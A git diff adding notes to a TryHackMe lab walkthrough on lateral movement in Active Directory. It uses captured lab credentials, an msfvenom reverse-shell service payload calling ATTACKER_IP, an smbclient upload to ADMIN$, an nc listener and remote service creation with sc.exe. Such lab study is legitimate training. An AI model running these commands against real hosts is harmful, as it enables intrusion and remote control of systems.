@@ -97,3 +97,36 @@ schtasks /S {TARGET} /TN {"THMtask1"} /DELETE /F
 
 
 ## Example
+Connecting to *THMJMP2* using the credentials assigned:
+`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`
+
+For this exercise, we will assume we have already captured some credentials with administrative access:
+	**User:** ZA.TRYHACKME.COM\t1_leonard.summers
+	**Password:** EZpass4ever
+
+We'll show how to use those credentials to move laterally to *THMIIS* using `sc.exe`. Feel free to try the other methods, as they all should work against *THMIIS*.
+	![](Pasted%20image%2020241116021722.png)
+While we have already shown how to use sc to create a user on a remote system (by using `net user`), we can also upload any binary we'd like to execute and associate it with the created service. However, if we try to run a reverse shell using this method, we will notice that the reverse shell disconnects immediately after execution. The reason for this is that service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately. Luckily for us, msfvenom supports the `exe-service` format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.
+
+- generate the payload using msfvenom on our machine
+```
+user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST={ATTACKER_IP} LPORT={4445} -o {myservice.exe}
+```
+
+-  use *t1_leonard.summers credentials* to upload our payload to the *ADMIN$* share of *THMIIS* using *smbclient* from our AttackBox:
+```
+user@AttackBox$ smbclient -c 'put {myservice.exe}' -U {user} -W ZA {'//thmiis.za.tryhackme.com/admin$/'} {password}
+```
+
+- starting a nc listener on specified port:
+```shell-session
+user@AttackBox$ nc -nvlp 4445
+```
+
+- create&start a new service remotely by using sc, associating it with our uploaded binary on THMJMP2: Command Prompt (As t1_leonard.summers):
+```shell-session
+C:\> sc.exe \\thmiis.za.tryhackme.com create {THMservice-3249} binPath= "%windir%\{myservice.exe}" start= auto
+C:\> sc.exe \\thmiis.za.tryhackme.com start {THMservice-3249}
+```
+
+- receive connection on attacking machine
